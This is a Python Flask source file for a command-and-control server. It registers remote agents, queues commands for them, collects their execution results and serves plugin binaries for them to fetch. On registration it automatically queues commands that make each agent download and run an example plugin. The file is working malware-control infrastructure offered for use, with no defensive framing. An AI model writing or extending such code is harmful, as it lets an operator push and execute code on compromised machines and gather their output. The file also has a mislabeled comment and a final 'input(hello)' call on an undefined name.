from flask import Flask, send_file, request
from utils import genAgentID
from DEF_C2 import AgentConnection, AgentCommand
from pathlib import Path
import hashlib

app = Flask(__name__)

agents={}
plugins={"agent":{}, "c2":{}} # 2 types of plugins agent and c2

@app.route("/register",methods=['POST', 'GET'])
def register_agent():
    id=genAgentID()
    AC = AgentConnection(id)
    AC.command_queue.append(AgentCommand(AgentCommand.DOWNLOAD, ["006642e0b7"])) #debug to add command to download example plugin (ID=006642e0b7)
    AC.command_queue.append(AgentCommand(AgentCommand.RUN, ["006642e0b7"])) #debug to add command to download example plugin (ID=006642e0b7)
    agents[id]=AC
    
    return {"id" : id}

@app.route("/command/<agent_id>")
def command_for_agent(agent_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    return agents[agent_id].serve_cmd()

@app.route("/results/<agent_id>/<execution_id>", methods=['POST'])
def results_from_agent(agent_id,execution_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    if execution_id not in agents[agent_id].results:
        return {"error":"Execution ID Not found"}, 400
    data = request.get_json()
    if ("plugin" not in data) or ("result" not in data):
        return {"error":"invalid parameters"}, 400
    agents[agent_id].results[execution_id] = data
    return data



@app.route("/download/<agent_id>/<plugin_id>")
def serve_plugin(agent_id,plugin_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    if plugin_id not in plugins['agent']:
        return {"error":"Plugin not found"}, 400
    
    plugin = plugins['agent'][plugin_id]
    plugin_file_path = (plugin / "agent" / "dist" / plugin.name)
    
    return send_file(str(plugin_file_path.resolve()))



def scanPlugins():
    if Path("plugins").is_dir() is True:
        pluginDir=Path("plugins")
    elif Path("../plugins").is_dir() is True:
        pluginDir=Path("../plugins")
    else:
        exit("cannot find plugin directory")
    for x in pluginDir.iterdir():
        if x.is_dir():
            #First 10 bytes of sha256(plugin name) is the ID
            plugin_id= hashlib.sha256(x.name.encode()).hexdigest()[0:10] 
            if (x/'agent').is_dir():
                plugins['agent'][plugin_id] = x
            if (x/'c2').is_dir():
                plugins['c2'][plugin_id] = x
    


if __name__ == '__main__':
    scanPlugins()
    app.run()
    input(hello)